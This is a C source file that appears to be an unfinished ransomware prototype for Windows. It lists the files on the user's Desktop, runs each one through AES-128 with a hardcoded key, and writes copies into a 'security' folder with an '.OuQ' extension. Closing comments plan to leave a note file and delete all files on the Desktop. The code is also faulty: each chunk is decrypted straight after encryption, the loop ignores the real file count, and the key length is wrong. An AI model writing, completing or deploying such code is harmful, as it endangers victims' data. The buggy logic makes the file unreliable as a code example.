#include "dir_tree.h"
#include "aes.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <direct.h> // For _mkdir on Windows
#include <sys/stat.h>

#define CHUNK_SIZE 32768 // 32KB
#define MAX_PATH_LEN 512

void watchUrDesktop()
{
    const char *user = getenv("USERPROFILE"); // Windows user home
    char desktop[MAX_PATH_LEN];

    if (user)
    {
        snprintf(desktop, sizeof(desktop), "%s\\Desktop", user);
    }
    else
    {
        fprintf(stderr, "cannot find the dir path\n");
        exit(1);
    }

    list_dir_recursive(desktop);
    write_list_txt();
}

void build_output_path(char *dest, size_t dest_size, const char *original_path)
{
    const char *basename = get_basename(original_path);
    snprintf(dest, dest_size, "./security/%s", basename);

    size_t len = strlen(dest);
    if (len < 4 || strcmp(dest + len - 4, ".OuQ") != 0)
    {
        strncat(dest, ".OuQ", dest_size - strlen(dest) - 1);
    }
}

int main(void)
{
    watchUrDesktop();

    for (int i = 0; i < file_index; i++)
    {
        printf("%s: %s\n", filenames[i][0], filenames[i][1]);
    }

    const char *folderName = "security";
    _mkdir(folderName);

    // encrpt file
    for (int i = 0; i < 100; i++)
    {
        FILE *fp = fopen(filenames[i][0], "rb");
        if (!fp)
        {
            perror("Create source file fail");
            continue;
        }

        char newFilePath[MAX_PATH_LEN];
        build_output_path(newFilePath, sizeof(newFilePath), filenames[i][0]);

        FILE *output = fopen(newFilePath, "wb");
        if (!output)
        {
            perror("Create file fail");
            fclose(fp);
            continue;
        }

        unsigned char buffer[CHUNK_SIZE];
        size_t bytesRead;
        while ((bytesRead = fread(buffer, 1, CHUNK_SIZE, fp)) > 0)
        {
            char *a = aes128(buffer, bytesRead, "1234567890ABCDEFG", BASE128, ENCRYPT);
            char *b = aes128(a, bytesRead + (BASE128 - (bytesRead % BASE128)), "1234567890ABCDEFG", BASE128, DECRYPT);
            fwrite(b, 1, bytesRead, output);
            free(a);
            free(b);
        }
        fclose(fp);
        fclose(output);
    }

    // step3: leave a txt with filename（已經由 write_list_txt 處理）
    // step4: delete all files on Desktop（可另寫函式）

    return 0;
}
